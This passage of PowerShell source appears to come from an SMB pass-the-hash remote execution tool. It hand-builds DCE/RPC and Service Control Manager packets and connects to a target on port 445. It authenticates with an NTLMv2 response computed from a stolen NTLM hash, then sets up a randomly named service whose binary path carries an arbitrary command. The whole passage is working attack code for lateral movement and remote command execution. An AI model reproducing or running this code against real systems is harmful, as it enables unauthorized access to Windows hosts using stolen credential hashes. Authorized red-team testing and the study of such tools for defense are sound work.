        $packet_RPCBind.Add("RPCBind_NumTransItems2",[Byte[]](0x01))

        $packet_RPCBind.Add("RPCBind_Unknown3",[Byte[]](0x00))

        $packet_RPCBind.Add("RPCBind_Interface2",[Byte[]](0xc4,0xfe,0xfc,0x99,0x60,0x52,0x1b,0x10,0xbb,0xcb,0x00,0xaa,0x00,0x21,0x34,0x7a))

        $packet_RPCBind.Add("RPCBind_InterfaceVer2",[Byte[]](0x00,0x00))

        $packet_RPCBind.Add("RPCBind_InterfaceVerMinor2",[Byte[]](0x00,0x00))

        $packet_RPCBind.Add("RPCBind_TransferSyntax2",[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

        $packet_RPCBind.Add("RPCBind_TransferSyntaxVer2",[Byte[]](0x01,0x00,0x00,0x00))

    }

    elseif($packet_num_ctx_items[0] -eq 3)

    {

        $packet_RPCBind.Add("RPCBind_ContextID2",[Byte[]](0x01,0x00))

        $packet_RPCBind.Add("RPCBind_NumTransItems2",[Byte[]](0x01))

        $packet_RPCBind.Add("RPCBind_Unknown3",[Byte[]](0x00))

        $packet_RPCBind.Add("RPCBind_Interface2",[Byte[]](0x43,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))

        $packet_RPCBind.Add("RPCBind_InterfaceVer2",[Byte[]](0x00,0x00))

        $packet_RPCBind.Add("RPCBind_InterfaceVerMinor2",[Byte[]](0x00,0x00))

        $packet_RPCBind.Add("RPCBind_TransferSyntax2",[Byte[]](0x33,0x05,0x71,0x71,0xba,0xbe,0x37,0x49,0x83,0x19,0xb5,0xdb,0xef,0x9c,0xcc,0x36))

        $packet_RPCBind.Add("RPCBind_TransferSyntaxVer2",[Byte[]](0x01,0x00,0x00,0x00))

        $packet_RPCBind.Add("RPCBind_ContextID3",[Byte[]](0x02,0x00))

        $packet_RPCBind.Add("RPCBind_NumTransItems3",[Byte[]](0x01))

        $packet_RPCBind.Add("RPCBind_Unknown4",[Byte[]](0x00))

        $packet_RPCBind.Add("RPCBind_Interface3",[Byte[]](0x43,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))

        $packet_RPCBind.Add("RPCBind_InterfaceVer3",[Byte[]](0x00,0x00))

        $packet_RPCBind.Add("RPCBind_InterfaceVerMinor3",[Byte[]](0x00,0x00))

        $packet_RPCBind.Add("RPCBind_TransferSyntax3",[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

        $packet_RPCBind.Add("RPCBind_TransferSyntaxVer3",[Byte[]](0x01,0x00,0x00,0x00))

        $packet_RPCBind.Add("RPCBind_AuthType",[Byte[]](0x0a))

        $packet_RPCBind.Add("RPCBind_AuthLevel",[Byte[]](0x04))

        $packet_RPCBind.Add("RPCBind_AuthPadLength",[Byte[]](0x00))

        $packet_RPCBind.Add("RPCBind_AuthReserved",[Byte[]](0x00))

        $packet_RPCBind.Add("RPCBind_ContextID4",[Byte[]](0x00,0x00,0x00,0x00))

        $packet_RPCBind.Add("RPCBind_Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))

        $packet_RPCBind.Add("RPCBind_MessageType",[Byte[]](0x01,0x00,0x00,0x00))

        $packet_RPCBind.Add("RPCBind_NegotiateFlags",[Byte[]](0x97,0x82,0x08,0xe2))

        $packet_RPCBind.Add("RPCBind_CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

        $packet_RPCBind.Add("RPCBind_CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

        $packet_RPCBind.Add("RPCBind_OSVersion",[Byte[]](0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f))

    }



    if($packet_call_ID -eq 3)

    {

        $packet_RPCBind.Add("RPCBind_AuthType",[Byte[]](0x0a))

        $packet_RPCBind.Add("RPCBind_AuthLevel",[Byte[]](0x02))

        $packet_RPCBind.Add("RPCBind_AuthPadLength",[Byte[]](0x00))

        $packet_RPCBind.Add("RPCBind_AuthReserved",[Byte[]](0x00))

        $packet_RPCBind.Add("RPCBind_ContextID3",[Byte[]](0x00,0x00,0x00,0x00))

        $packet_RPCBind.Add("RPCBind_Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))

        $packet_RPCBind.Add("RPCBind_MessageType",[Byte[]](0x01,0x00,0x00,0x00))

        $packet_RPCBind.Add("RPCBind_NegotiateFlags",[Byte[]](0x97,0x82,0x08,0xe2))

        $packet_RPCBind.Add("RPCBind_CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

        $packet_RPCBind.Add("RPCBind_CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

        $packet_RPCBind.Add("RPCBind_OSVersion",[Byte[]](0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f))

    }



    return $packet_RPCBind

}



function Get-PacketRPCRequest()

{

    param([Byte[]]$packet_flags,[Int]$packet_service_length,[Int]$packet_auth_length,[Int]$packet_auth_padding,[Byte[]]$packet_call_ID,[Byte[]]$packet_context_ID,[Byte[]]$packet_opnum,[Byte[]]$packet_data)



    if($packet_auth_length -gt 0)

    {

        $packet_full_auth_length = $packet_auth_length + $packet_auth_padding + 8

    }



    [Byte[]]$packet_write_length = [System.BitConverter]::GetBytes($packet_service_length + 24 + $packet_full_auth_length + $packet_data.Length)

    [Byte[]]$packet_frag_length = $packet_write_length[0,1]

    [Byte[]]$packet_alloc_hint = [System.BitConverter]::GetBytes($packet_service_length + $packet_data.Length)

    [Byte[]]$packet_auth_length = [System.BitConverter]::GetBytes($packet_auth_length)

    $packet_auth_length = $packet_auth_length[0,1]



    $packet_RPCRequest = New-Object System.Collections.Specialized.OrderedDictionary

    $packet_RPCRequest.Add("RPCRequest_Version",[Byte[]](0x05))

    $packet_RPCRequest.Add("RPCRequest_VersionMinor",[Byte[]](0x00))

    $packet_RPCRequest.Add("RPCRequest_PacketType",[Byte[]](0x00))

    $packet_RPCRequest.Add("RPCRequest_PacketFlags",$packet_flags)

    $packet_RPCRequest.Add("RPCRequest_DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))

    $packet_RPCRequest.Add("RPCRequest_FragLength",$packet_frag_length)

    $packet_RPCRequest.Add("RPCRequest_AuthLength",$packet_auth_length)

    $packet_RPCRequest.Add("RPCRequest_CallID",$packet_call_ID)

    $packet_RPCRequest.Add("RPCRequest_AllocHint",$packet_alloc_hint)

    $packet_RPCRequest.Add("RPCRequest_ContextID",$packet_context_ID)

    $packet_RPCRequest.Add("RPCRequest_Opnum",$packet_opnum)



    if($packet_data.Length)

    {

        $packet_RPCRequest.Add("RPCRequest_Data",$packet_data)

    }



    return $packet_RPCRequest

}



#SCM



function Get-PacketSCMOpenSCManagerW()

{

    param ([Byte[]]$packet_service,[Byte[]]$packet_service_length)



    [Byte[]]$packet_write_length = [System.BitConverter]::GetBytes($packet_service.Length + 92)

    [Byte[]]$packet_frag_length = $packet_write_length[0,1]

    [Byte[]]$packet_alloc_hint = [System.BitConverter]::GetBytes($packet_service.Length + 68)

    $packet_referent_ID1 = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})

    $packet_referent_ID1 = $packet_referent_ID1.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

    $packet_referent_ID1 += 0x00,0x00

    $packet_referent_ID2 = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})

    $packet_referent_ID2 = $packet_referent_ID2.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

    $packet_referent_ID2 += 0x00,0x00



    $packet_SCMOpenSCManagerW = New-Object System.Collections.Specialized.OrderedDictionary

    $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_MachineName_ReferentID",$packet_referent_ID1)

    $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_MachineName_MaxCount",$packet_service_length)

    $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_MachineName_Offset",[Byte[]](0x00,0x00,0x00,0x00))

    $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_MachineName_ActualCount",$packet_service_length)

    $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_MachineName",$packet_service)

    $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_Database_ReferentID",$packet_referent_ID2)

    $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_Database_NameMaxCount",[Byte[]](0x0f,0x00,0x00,0x00))

    $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_Database_NameOffset",[Byte[]](0x00,0x00,0x00,0x00))

    $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_Database_NameActualCount",[Byte[]](0x0f,0x00,0x00,0x00))

    $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_Database",[Byte[]](0x53,0x00,0x65,0x00,0x72,0x00,0x76,0x00,0x69,0x00,0x63,0x00,0x65,0x00,0x73,0x00,0x41,0x00,0x63,0x00,0x74,0x00,0x69,0x00,0x76,0x00,0x65,0x00,0x00,0x00))

    $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_Unknown",[Byte[]](0xbf,0xbf))

    $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_AccessMask",[Byte[]](0x3f,0x00,0x00,0x00))

    

    return $packet_SCMOpenSCManagerW

}



function Get-PacketSCMCreateServiceW()

{

    param([Byte[]]$packet_context_handle,[Byte[]]$packet_service,[Byte[]]$packet_service_length,

            [Byte[]]$packet_command,[Byte[]]$packet_command_length)

                

    $packet_referent_ID = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})

    $packet_referent_ID = $packet_referent_ID.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

    $packet_referent_ID += 0x00,0x00



    $packet_SCMCreateServiceW = New-Object System.Collections.Specialized.OrderedDictionary

    $packet_SCMCreateServiceW.Add("SCMCreateServiceW_ContextHandle",$packet_context_handle)

    $packet_SCMCreateServiceW.Add("SCMCreateServiceW_ServiceName_MaxCount",$packet_service_length)

    $packet_SCMCreateServiceW.Add("SCMCreateServiceW_ServiceName_Offset",[Byte[]](0x00,0x00,0x00,0x00))

    $packet_SCMCreateServiceW.Add("SCMCreateServiceW_ServiceName_ActualCount",$packet_service_length)

    $packet_SCMCreateServiceW.Add("SCMCreateServiceW_ServiceName",$packet_service)

    $packet_SCMCreateServiceW.Add("SCMCreateServiceW_DisplayName_ReferentID",$packet_referent_ID)

    $packet_SCMCreateServiceW.Add("SCMCreateServiceW_DisplayName_MaxCount",$packet_service_length)

    $packet_SCMCreateServiceW.Add("SCMCreateServiceW_DisplayName_Offset",[Byte[]](0x00,0x00,0x00,0x00))

    $packet_SCMCreateServiceW.Add("SCMCreateServiceW_DisplayName_ActualCount",$packet_service_length)

    $packet_SCMCreateServiceW.Add("SCMCreateServiceW_DisplayName",$packet_service)

    $packet_SCMCreateServiceW.Add("SCMCreateServiceW_AccessMask",[Byte[]](0xff,0x01,0x0f,0x00))

    $packet_SCMCreateServiceW.Add("SCMCreateServiceW_ServiceType",[Byte[]](0x10,0x00,0x00,0x00))

    $packet_SCMCreateServiceW.Add("SCMCreateServiceW_ServiceStartType",[Byte[]](0x03,0x00,0x00,0x00))

    $packet_SCMCreateServiceW.Add("SCMCreateServiceW_ServiceErrorControl",[Byte[]](0x00,0x00,0x00,0x00))

    $packet_SCMCreateServiceW.Add("SCMCreateServiceW_BinaryPathName_MaxCount",$packet_command_length)

    $packet_SCMCreateServiceW.Add("SCMCreateServiceW_BinaryPathName_Offset",[Byte[]](0x00,0x00,0x00,0x00))

    $packet_SCMCreateServiceW.Add("SCMCreateServiceW_BinaryPathName_ActualCount",$packet_command_length)

    $packet_SCMCreateServiceW.Add("SCMCreateServiceW_BinaryPathName",$packet_command)

    $packet_SCMCreateServiceW.Add("SCMCreateServiceW_NULLPointer",[Byte[]](0x00,0x00,0x00,0x00))

    $packet_SCMCreateServiceW.Add("SCMCreateServiceW_TagID",[Byte[]](0x00,0x00,0x00,0x00))

    $packet_SCMCreateServiceW.Add("SCMCreateServiceW_NULLPointer2",[Byte[]](0x00,0x00,0x00,0x00))

    $packet_SCMCreateServiceW.Add("SCMCreateServiceW_DependSize",[Byte[]](0x00,0x00,0x00,0x00))

    $packet_SCMCreateServiceW.Add("SCMCreateServiceW_NULLPointer3",[Byte[]](0x00,0x00,0x00,0x00))

    $packet_SCMCreateServiceW.Add("SCMCreateServiceW_NULLPointer4",[Byte[]](0x00,0x00,0x00,0x00))

    $packet_SCMCreateServiceW.Add("SCMCreateServiceW_PasswordSize",[Byte[]](0x00,0x00,0x00,0x00))



    return $packet_SCMCreateServiceW

}



function Get-PacketSCMStartServiceW()

{

    param([Byte[]]$packet_context_handle)



    $packet_SCMStartServiceW = New-Object System.Collections.Specialized.OrderedDictionary

    $packet_SCMStartServiceW.Add("SCMStartServiceW_ContextHandle",$packet_context_handle)

    $packet_SCMStartServiceW.Add("SCMStartServiceW_Unknown",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))



    return $packet_SCMStartServiceW

}



function Get-PacketSCMDeleteServiceW()

{

    param([Byte[]]$packet_context_handle)



    $packet_SCMDeleteServiceW = New-Object System.Collections.Specialized.OrderedDictionary

    $packet_SCMDeleteServiceW.Add("SCMDeleteServiceW_ContextHandle",$packet_context_handle)



    return $packet_SCMDeleteServiceW

}



function Get-PacketSCMCloseServiceHandle()

{

    param([Byte[]]$packet_context_handle)



    $packet_SCM_CloseServiceW = New-Object System.Collections.Specialized.OrderedDictionary

    $packet_SCM_CloseServiceW.Add("SCMCloseServiceW_ContextHandle",$packet_context_handle)



    return $packet_SCM_CloseServiceW

}



function DataLength2

{

    param ([Int]$length_start,[Byte[]]$string_extract_data)



    $string_length = [System.BitConverter]::ToUInt16($string_extract_data[$length_start..($length_start + 1)],0)



    return $string_length

}



if($hash -like "*:*")

{

    $hash = $hash.SubString(($hash.IndexOf(":") + 1),32)

}



if($Domain)

{

    $output_username = $Domain + "\" + $Username

}

else

{

    $output_username = $Username

}



$process_ID = [System.Diagnostics.Process]::GetCurrentProcess() | Select-Object -expand id

$process_ID = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($process_ID))

$process_ID = $process_ID -replace "-00-00",""

[Byte[]]$process_ID_bytes = $process_ID.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

$SMB_client = New-Object System.Net.Sockets.TCPClient

$SMB_client.Client.ReceiveTimeout = 60000



try

{

    $SMB_client.Connect($Target,"445")

}

catch

{

    Write-Output "$Target did not respond"

}



if($SMB_client.Connected)

{

    $SMB_client_stream = $SMB_client.GetStream()

    $SMB_client_receive = New-Object System.Byte[] 1024

    $SMB_client_stage = 'NegotiateSMB'



    while($SMB_client_stage -ne 'exit')

    {

        

        switch ($SMB_client_stage)

        {



            'NegotiateSMB'

            {          

                $packet_SMB_header = Get-PacketSMBHeader 0x72 0x18 0x01,0x48 0xff,0xff $process_ID_bytes 0x00,0x00       

                $packet_SMB_data = Get-PacketSMBNegotiateProtocolRequest $SMB_version

                $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header

                $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data

                $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length

                $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data

                $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null

                $SMB_client_stream.Flush()    

                $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null



                if([System.BitConverter]::ToString($SMB_client_receive[4..7]) -eq 'ff-53-4d-42')

                {

                    $SMB_version = 'SMB1'

                    $SMB_client_stage = 'NTLMSSPNegotiate'



                    if([System.BitConverter]::ToString($SMB_client_receive[39]) -eq '0f')

                    {

                        Write-Verbose "SMB signing is enabled"

                        $SMB_signing = $true

                        $SMB_session_key_length = 0x00,0x00

                        $SMB_negotiate_flags = 0x15,0x82,0x08,0xa0

                    }

                    else

                    {

                        $SMB_signing = $false

                        $SMB_session_key_length = 0x00,0x00

                        $SMB_negotiate_flags = 0x05,0x82,0x08,0xa0

                    }



                }

                else

                {

                    $SMB_client_stage = 'NegotiateSMB2'



                    if([System.BitConverter]::ToString($SMB_client_receive[70]) -eq '03')

                    {

                        Write-Verbose "SMB signing is enabled"

                        $SMB_signing = $true

                        $SMB_session_key_length = 0x00,0x00

                        $SMB_negotiate_flags = 0x15,0x82,0x08,0xa0

                    }

                    else

                    {

                        $SMB_signing = $false

                        $SMB_session_key_length = 0x00,0x00

                        $SMB_negotiate_flags = 0x05,0x80,0x08,0xa0

                    }



                }



            }



            'NegotiateSMB2'

            {

                $SMB2_tree_ID = 0x00,0x00,0x00,0x00

                $SMB_session_ID = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00

                $SMB2_message_ID = 1

                $packet_SMB2_header = Get-PacketSMB2Header 0x00,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID  

                $packet_SMB2_data = Get-PacketSMB2NegotiateProtocolRequest

                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data

                $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length

                $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data

                $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null

                $SMB_client_stream.Flush()    

                $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                $SMB_client_stage = 'NTLMSSPNegotiate'

            }

                

            'NTLMSSPNegotiate'

            { 

                if($SMB_version -eq 'SMB1')

                {

                    $packet_SMB_header = Get-PacketSMBHeader 0x73 0x18 0x07,0xc8 0xff,0xff $process_ID_bytes 0x00,0x00



                    if($SMB_signing)

                    {

                        $packet_SMB_header["SMBHeader_Flags2"] = 0x05,0x48

                    }



                    $packet_NTLMSSP_negotiate = Get-PacketNTLMSSPNegotiate $SMB_negotiate_flags

                    $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header

                    $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate       

                    $packet_SMB_data = Get-PacketSMBSessionSetupAndXRequest $NTLMSSP_negotiate

                    $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data

                    $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length

                    $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                    $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data

                }

                else

                {

                    $SMB2_message_ID += 1

                    $packet_SMB2_header = Get-PacketSMB2Header 0x01,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID

                    $packet_NTLMSSP_negotiate = Get-PacketNTLMSSPNegotiate $SMB_negotiate_flags

                    $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                    $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate       

                    $packet_SMB2_data = Get-PacketSMB2SessionSetupRequest $NTLMSSP_negotiate

                    $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data

                    $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length

                    $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                    $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data

                }



                $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null

                $SMB_client_stream.Flush()    

                $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                $SMB_client_stage = 'exit'

            }

            

        }



    }



    $SMB_NTLMSSP = [System.BitConverter]::ToString($SMB_client_receive)

    $SMB_NTLMSSP = $SMB_NTLMSSP -replace "-",""

    $SMB_NTLMSSP_index = $SMB_NTLMSSP.IndexOf("4E544C4D53535000")

    $SMB_NTLMSSP_bytes_index = $SMB_NTLMSSP_index / 2

    $SMB_domain_length = DataLength2 ($SMB_NTLMSSP_bytes_index + 12) $SMB_client_receive

    $SMB_target_length = DataLength2 ($SMB_NTLMSSP_bytes_index + 40) $SMB_client_receive

    $SMB_session_ID = $SMB_client_receive[44..51]

    $SMB_NTLM_challenge = $SMB_client_receive[($SMB_NTLMSSP_bytes_index + 24)..($SMB_NTLMSSP_bytes_index + 31)]

    $SMB_target_details = $SMB_client_receive[($SMB_NTLMSSP_bytes_index + 56 + $SMB_domain_length)..($SMB_NTLMSSP_bytes_index + 55 + $SMB_domain_length + $SMB_target_length)]

    $SMB_target_time_bytes = $SMB_target_details[($SMB_target_details.Length - 12)..($SMB_target_details.Length - 5)]

    $NTLM_hash_bytes = (&{for ($i = 0;$i -lt $hash.Length;$i += 2){$hash.SubString($i,2)}}) -join "-"

    $NTLM_hash_bytes = $NTLM_hash_bytes.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

    $auth_hostname = (Get-ChildItem -path env:computername).Value

    $auth_hostname_bytes = [System.Text.Encoding]::Unicode.GetBytes($auth_hostname)

    $auth_domain_bytes = [System.Text.Encoding]::Unicode.GetBytes($Domain)

    $auth_username_bytes = [System.Text.Encoding]::Unicode.GetBytes($username)

    $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)

    $auth_domain_length = $auth_domain_length[0,1]

    $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)

    $auth_domain_length = $auth_domain_length[0,1]

    $auth_username_length = [System.BitConverter]::GetBytes($auth_username_bytes.Length)

    $auth_username_length = $auth_username_length[0,1]

    $auth_hostname_length = [System.BitConverter]::GetBytes($auth_hostname_bytes.Length)

    $auth_hostname_length = $auth_hostname_length[0,1]

    $auth_domain_offset = 0x40,0x00,0x00,0x00

    $auth_username_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + 64)

    $auth_hostname_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + 64)

    $auth_LM_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 64)

    $auth_NTLM_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 88)

    $HMAC_MD5 = New-Object System.Security.Cryptography.HMACMD5

    $HMAC_MD5.key = $NTLM_hash_bytes

    $username_and_target = $username.ToUpper()

    $username_and_target_bytes = [System.Text.Encoding]::Unicode.GetBytes($username_and_target)

    $username_and_target_bytes += $auth_domain_bytes

    $NTLMv2_hash = $HMAC_MD5.ComputeHash($username_and_target_bytes)

    $client_challenge = [String](1..8 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})

    $client_challenge_bytes = $client_challenge.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}



    $security_blob_bytes = 0x01,0x01,0x00,0x00,

                            0x00,0x00,0x00,0x00 +

                            $SMB_target_time_bytes +

                            $client_challenge_bytes +

                            0x00,0x00,0x00,0x00 +

                            $SMB_target_details +

                            0x00,0x00,0x00,0x00,

                            0x00,0x00,0x00,0x00



    $server_challenge_and_security_blob_bytes = $SMB_NTLM_challenge + $security_blob_bytes

    $HMAC_MD5.key = $NTLMv2_hash

    $NTLMv2_response = $HMAC_MD5.ComputeHash($server_challenge_and_security_blob_bytes)



    if($SMB_signing)

    {

        $session_base_key = $HMAC_MD5.ComputeHash($NTLMv2_response)

        $session_key = $session_base_key

        $HMAC_SHA256 = New-Object System.Security.Cryptography.HMACSHA256

        $HMAC_SHA256.key = $session_key

    }



    $NTLMv2_response = $NTLMv2_response + $security_blob_bytes

    $NTLMv2_response_length = [System.BitConverter]::GetBytes($NTLMv2_response.Length)

    $NTLMv2_response_length = $NTLMv2_response_length[0,1]

    $SMB_session_key_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + $NTLMv2_response.Length + 88)



    $NTLMSSP_response = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,

                            0x03,0x00,0x00,0x00,

                            0x18,0x00,

                            0x18,0x00 +

                            $auth_LM_offset +

                            $NTLMv2_response_length +

                            $NTLMv2_response_length +

                            $auth_NTLM_offset +

                            $auth_domain_length +

                            $auth_domain_length +

                            $auth_domain_offset +

                            $auth_username_length +

                            $auth_username_length +

                            $auth_username_offset +

                            $auth_hostname_length +

                            $auth_hostname_length +

                            $auth_hostname_offset +

                            $SMB_session_key_length +

                            $SMB_session_key_length +

                            $SMB_session_key_offset +

                            $SMB_negotiate_flags +

                            $auth_domain_bytes +

                            $auth_username_bytes +

                            $auth_hostname_bytes +

                            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,

                            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +

                            $NTLMv2_response



    if($SMB_version -eq 'SMB1')

    {

        $SMB_user_ID = $SMB_client_receive[32,33]

        $packet_SMB_header = Get-PacketSMBHeader 0x73 0x18 0x07,0xc8 0xff,0xff $process_ID_bytes $SMB_user_ID



        if($SMB_signing)

        {

            $packet_SMB_header["SMBHeader_Flags2"] = 0x05,0x48

        }



        $packet_SMB_header["SMBHeader_UserID"] = $SMB_user_ID

        $packet_NTLMSSP_negotiate = Get-PacketNTLMSSPAuth $NTLMSSP_response

        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header

        $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate      

        $packet_SMB_data = Get-PacketSMBSessionSetupAndXRequest $NTLMSSP_negotiate

        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data

        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length

        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data

    }

    else

    {

        $SMB2_message_ID += 1

        $packet_SMB2_header = Get-PacketSMB2Header 0x01,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID

        $packet_NTLMSSP_auth = Get-PacketNTLMSSPAuth $NTLMSSP_response

        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

        $NTLMSSP_auth = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_auth        

        $packet_SMB2_data = Get-PacketSMB2SessionSetupRequest $NTLMSSP_auth

        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data

        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length

        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data

    }



    $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null

    $SMB_client_stream.Flush()

    $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null



    if($SMB_version -eq 'SMB1')

    {



        if([System.BitConverter]::ToString($SMB_client_receive[9..12]) -eq '00-00-00-00')

        {

            Write-Verbose "$output_username successfully authenticated on $Target"

            $login_successful = $true

        }

        else

        {

            Write-Output "$output_username failed to authenticate on $Target"

            $login_successful = $false

        }



    }

    else

    {

        if([System.BitConverter]::ToString($SMB_client_receive[12..15]) -eq '00-00-00-00')

        {

            Write-Verbose "$output_username successfully authenticated on $Target"

            $login_successful = $true

        }

        else

        {

            Write-Output "$output_username failed to authenticate on $Target"

            $login_successful = $false

        }



    }



    if($login_successful)

    {

        $SMB_path = "\\" + $Target + "\IPC$"



        if($SMB_version -eq 'SMB1')

        {

            $SMB_path_bytes = [System.Text.Encoding]::UTF8.GetBytes($SMB_path) + 0x00

        }

        else

        {

            $SMB_path_bytes = [System.Text.Encoding]::Unicode.GetBytes($SMB_path)

        }



        $SMB_named_pipe_UUID = 0x81,0xbb,0x7a,0x36,0x44,0x98,0xf1,0x35,0xad,0x32,0x98,0xf0,0x38,0x00,0x10,0x03



        if(!$Service)

        {

            $SMB_service_random = [String]::Join("00-",(1..20 | ForEach-Object{"{0:X2}-" -f (Get-Random -Minimum 65 -Maximum 90)}))

            $SMB_service = $SMB_service_random -replace "-00",""

            $SMB_service = $SMB_service.Substring(0,$SMB_service.Length - 1)

            $SMB_service = $SMB_service.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

            $SMB_service = New-Object System.String ($SMB_service,0,$SMB_service.Length)

            $SMB_service_random += '00-00-00-00-00'

            $SMB_service_bytes = $SMB_service_random.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

        }

        else

        {

